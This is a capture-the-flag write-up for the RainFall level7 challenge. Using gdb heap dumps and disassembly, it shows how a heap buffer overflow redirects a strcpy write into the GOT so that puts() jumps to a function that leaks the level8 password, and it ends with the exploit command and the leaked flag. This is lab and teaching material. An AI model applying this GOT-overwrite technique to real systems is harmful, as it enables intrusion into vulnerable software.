# Similar type of exploit than last level.
# By putting a breakpoint after the last call to malloc, we can see the state
# of the heap :

(gdb) c
Continuing.
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00020fd1	0x00000000	0x00000000

# Each block contains 1 int and a pointer to a location in the heap right
# after.
# The program copies the first argument of argv into the 2nd heap block,
# and the second into the 4th heap block.
# Here is a dump of the heap with input "./level7 AAAA BBBB" :

(gdb) c
Continuing.
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
0x804a040:	0x00000000	0x00020fc1

# When looking at the addresses written on the stack before the call to fopen,
# we find this :

(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
(gdb) x/s 0x80486e9
0x80486e9:	 "r"

# Then, when inspecting the arguments passed to fgets, another hint :

(gdb) x/s 0x8049960
0x8049960 <c>:	 ""

# By looking at defined functions, we can see this :

(gdb) disas m
Dump of assembler code for function m:
	0x080484f4 <+0>:	push   %ebp
	0x080484f5 <+1>:	mov    %esp,%ebp
	0x080484f7 <+3>:	sub    $0x18,%esp
	0x080484fa <+6>:	movl   $0x0,(%esp)

	0x08048501 <+13>:	call   0x80483d0 <time@plt>
	0x08048506 <+18>:	mov    $0x80486e0,%edx
	0x0804850b <+23>:	mov    %eax,0x8(%esp)
	0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
	0x08048517 <+35>:	mov    %edx,(%esp)
	0x0804851a <+38>:	call   0x80483b0 <printf@plt>
	
	printf("%s - %d\n", c, time(NULL));

# Here, we can look at the disassembly of puts() to get another hint :

(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
	0x08048400 <+0>:	jmp    *0x8049928
	0x08048406 <+6>:	push   $0x28
	0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.

(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406 <== this is the address of puts()

# We need to redirect the flow of execution to that function m, which will leak
# the content of the buffer c, thanks to a heap buffer overflow.
# Here, we're going to use the second call to strcpy() to overwrite the address
# of puts() with the address of m().
# The first call to strcpy() will overflow its boundaries so that when the
# second call to strcpy() is made, instead of writing argv[2] on the heap,
# it'll be written in the GOT.
# This is the state of the heap before the second call to strcpy() :

(gdb) x/20wx 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928 <== target in GOT
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000

# The result is :

level7@RainFall:~$ ./level7 `python /tmp/payload.py 1` `python /tmp/payload.py 2`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1586201843
